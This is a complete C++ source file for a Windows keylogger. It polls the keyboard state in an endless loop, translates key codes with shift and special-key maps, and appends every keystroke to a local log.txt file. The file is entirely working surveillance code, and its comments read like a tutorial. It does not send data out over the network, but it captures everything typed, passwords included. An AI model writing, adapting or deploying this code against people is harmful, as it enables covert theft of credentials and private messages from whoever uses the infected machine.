#include <Windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <unordered_map>

bool isSpecialKey(int key);
void logKey(char key);
void logKey(std::string key);

std::unordered_map<int, char> shiftKeyMap = { {48, ')'},{49, '!'}, {50, '@'}, {51, '#'}, 
	{52, '$'}, {53, '%'}, {54, '^'}, {55, '&'}, {56, '*'}, {57, '('}, {189, '_'}, 
	{187, '+'}, {219, '{'}, {221, '}'}, {220, '|'},	{186, ':'}, {222, '\"'}, 
	{188, '<'}, {190, '>'}, {191, '?'} };

std::unordered_map<int, char> otherPrintableMap = { {187, '='}, {189, '-'}, {219, '['}, {220, '\\'},
	{221, ']'}, {186, ';'}, {222, '\''}, {188, ','}, {190, '.'}, {191, '/'}};

std::unordered_map<int, std::string> specialKeyMap = { {VK_TAB, "\t"}, {VK_RETURN, "\n"}, {VK_BACK, "[BACK]"},
	{VK_CONTROL, "[CTRL]"}, {VK_CAPITAL, "[CAPS]"}, {VK_DELETE, "[DEL]"}, {VK_ESCAPE, "[ESC]"}};

int main() {

	while (true) {
		// Preserve CPU resources by sleeping for a little while each round
		Sleep(10);

		// Ascii key value set ranges from 8 (backspace) to 255 (Latin small letter y with diaeresis)
		// Check if any one of these was pressed
		for (int i = 8; i <= 255; i++) {
			// If a key is pressed...
			if (GetAsyncKeyState(i) == -32767) {
				
				// Check if high-order bit is set, meaning shift-key is pressed
				bool isShiftPressed = ((GetKeyState(VK_SHIFT) & 0x8000) != 0);

				// If the key pressed is a letter or number or space...
				if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57) || i == 32) {
				
					// and shift isn't pressed...
					if ((i >= 65 && i <= 90) && !isShiftPressed) {
						// Explicit-type convert key to lowercase by adding 32
						logKey(static_cast<char>(i + 32));
					}

					// If shift key is pressed...
					else if ((i >= 65 && i <= 90) && isShiftPressed) {
						// log as capitalized
						logKey(static_cast<char>(i));
					}
					// If shift is pressed and the key is a number...
					else if ((isShiftPressed && shiftKeyMap.count(i) > 0)) {
						// log the key's value in shiftKeyMap
						logKey(shiftKeyMap[i]);
					}

				}
				// If shift is down, the key is not alphanumeric, and its in the shiftKeyMap...
				else if (isShiftPressed && shiftKeyMap.count(i) > 0) {
					// log that shift key value
					logKey(shiftKeyMap[i]);
				}
				// If the key is another sort of printable character...
				else if(otherPrintableMap[i] > 0){
					// log that value according to the otherPrintableMap
					logKey(otherPrintableMap[i]);
				}
				// If the key is in the specialKeyMap...
				else if (isSpecialKey(i) > 0) {
					// log that value according to the specialKeyMap
					logKey(specialKeyMap[i]);
				}
			}
		}
	}
	return 0;
}

void logKey(char key) {
	std::ofstream file("log.txt", std::ios_base::app);
	if (file.is_open()) {
		file << key;
		file.flush();
	}

}

void logKey(std::string key) {
	std::ofstream file("log.txt", std::ios_base::app);
	if (file.is_open()) {
		file << key;
		file.flush();
	}

}

bool isSpecialKey(int key) {
	// Virtual-Key codes: https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
	switch (key) {
	case VK_TAB:
		return true;
	case VK_BACK:
		return true;
	case VK_RETURN:
		return true;
	case VK_CONTROL:
		return true;
	case VK_CAPITAL:
		return true;
	case VK_ESCAPE:
		return true;
	case VK_DELETE:
		return true;
	default:
		return false;
	}
}

